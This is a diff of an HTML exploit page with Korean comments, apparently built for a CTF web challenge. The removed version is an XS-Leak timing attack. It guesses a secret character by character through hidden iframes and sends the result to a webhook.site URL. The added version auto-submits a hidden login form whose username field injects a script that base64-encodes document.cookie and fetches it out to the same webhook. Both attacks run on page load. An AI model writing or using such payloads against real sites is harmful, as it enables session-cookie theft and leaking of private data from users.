@@ -1,88 +1,47 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>XS-Leak Attack</title>
-</head>
-<body>
-    <h1>Attack is running...</h1>
-    <p>This page is attempting to leak the admin's note name.</p>
-    <p>Check your webhook page for the result.</p>
-
+  <body>
     <script>
-        // ===============================================================
-        //           ▼▼▼ 사용자 설정 영역 (3곳을 수정하세요) ▼▼▼
-        // ===============================================================
+      function startExploit() {
+        // 1. https://webhook.site/ 에 방문해서 고유 URL을 복사하세요.
+        // 2. 아래 'webhookUrl' 변수의 값을 복사한 URL로 바꾸세요.
+        const webhookUrl = 'https://webhook.site/37bdbd68-15e2-4abe-8c35-33e87e040b14';
 
-        // 1. 공격할 대상의 URL (CTF 문제의 주소로 변경)
-        const TARGET_URL = "https://web-client-ch56.challenge01.root-me.org:58056/notes/1710";
+        const form = document.createElement('form');
+        form.method = 'POST';
+        // 봇이 상호작용하는 CTF 서버 주소. (bot.js의 BASE_URL 참고)
+        form.action = 'http://122.0.0.1:58039/login'; 
 
-        // 2. 결과를 받을 자신의 webhook.site 주소
-        const WEBHOOK_URL = "https://webhook.site/37bdbd68-15e2-4abe-8c35-33e87e040b14";
+        const usernameInput = document.createElement('input');
+        usernameInput.type = 'hidden';
+        usernameInput.name = 'username';
+        
+        // 페이로드: document.cookie를 읽어서 지정된 웹훅 URL로 보냅니다.
+        usernameInput.value = `<script>
+          fetch('${webhookUrl}?data=' + btoa(document.cookie));
+        <\/script>`;
+        
+        const passwordInput = document.createElement('input');
+        passwordInput.type = 'hidden';
+        passwordInput.name = 'password';
+        passwordInput.value = 'trigger-login-fail';
 
-        // 3. 디버깅을 통해 알아낸 시간 임계값(THRESHOLD) (단위: ms)
-        //    이 값보다 오래 걸리면 정답으로 간주합니다.
-        const THRESHOLD = 350;
+        const csrfInput = document.createElement('input');
+        csrfInput.type = 'hidden';
+        csrfInput.name = '_csrf';
+        csrfInput.value = '';
 
-        // ===============================================================
+        form.appendChild(usernameInput);
+        form.appendChild(passwordInput);
+        form.appendChild(csrfInput);
 
-        async function leak() {
-            // 추측할 문자 집합 (필요시 대문자나 특수문자 추가)
-            const charset = "abcdefghijklmnopqrstuvwxyz0123456789_{}";
-            let flag = "";
-
-            console.log("Attack started!");
-
-            while (true) {
-                let foundChar = false;
-                for (const char of charset) {
-                    const currentGuess = flag + char;
-                    
-                    // isMatch가 true를 반환할 때까지 반복
-                    const isMatch = await checkTime(TARGET_URL + encodeURIComponent(currentGuess));
-
-                    if (isMatch) {
-                        flag += char;
-                        console.log("Found:", flag);
-                        foundChar = true;
-                        break; // 정답 문자를 찾았으면 다음 자리로 이동
-                    }
-                }
-
-                // 더 이상 찾을 문자가 없거나, 플래그가 끝나는 문자로 끝나면 공격 종료
-                if (!foundChar || flag.endsWith("}")) {
-                    console.log("Attack finished!");
-                    console.log("Final Leaked Flag:", flag);
-                    
-                    // 최종 결과를 웹훅으로 전송
-                    fetch(WEBHOOK_URL + "?flag=" + encodeURIComponent(flag));
-                    break;
-                }
-            }
-        }
-
-        function checkTime(url) {
-            return new Promise(resolve => {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = "none"; // iframe을 화면에 보이지 않게 숨김
-                let startTime;
-
-                iframe.onload = () => {
-                    const duration = performance.now() - startTime;
-                    document.body.removeChild(iframe); // 작업이 끝나면 iframe 제거
-                    
-                    // 설정한 임계값(THRESHOLD)보다 오래 걸렸는지 여부를 반환
-                    resolve(duration > THRESHOLD);
-                };
-                
-                // iframe의 src를 설정하기 직전에 시간 측정 시작
-                startTime = performance.now();
-                iframe.src = url;
-                document.body.appendChild(iframe);
-            });
-        }
-
-        // 페이지가 로드되면 바로 공격 시작
-        leak();
+        document.body.appendChild(form);
+        form.submit();
+      }
+      
+      // 페이지가 로드되면 바로 공격 시작
+      window.onload = startExploit;
     </script>
-</body>
+    <h1>Executing...</h1>
+  </body>
 </html>
+
